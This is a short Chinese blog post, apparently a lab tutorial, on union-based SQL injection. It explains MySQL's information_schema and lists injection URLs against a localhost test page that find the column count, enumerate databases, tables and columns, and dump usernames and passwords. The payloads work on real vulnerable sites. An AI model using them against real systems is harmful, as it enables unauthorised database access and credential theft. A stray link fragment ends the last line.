sql union基础注入！
发表于 2019-08-08| 更新于 2019-08-14

关于5.0版本下的数据库

information_schema //mysql5.0以上的版本，保存了所有的数据库名，表名，字段名
schemata //此表保存了所有的数据库名
tables //此表保存了所有的表名
columns //此表保存了所有的字段名

table_schema //查数据库名
table_name //查表名
column_name //查字段名

具体的实验命令代码

http://127.0.0.1/web/union.php?id=1
http://127.0.0.1/web/union.php?id=1 order by 1-99 //判断字段数为6
http://127.0.0.1/web/union.php?id=1 union select 1,2,3,4,5,6
http://127.0.0.1/web/union.php?id=1 union select 1,2,3,database(),5,6 //爆库为test
http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),5,6 //爆表users
http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=’test’ and TABLE_NAME=’users’),5,6 //爆字段id,username,password,address,email,ip
http://127.0.0.1/web/union.php?id=1 union select 1,2,3,(select group_concat(username,password) from test.users),5,6 //爆数据https://hexo.io/docs/deployment.html)
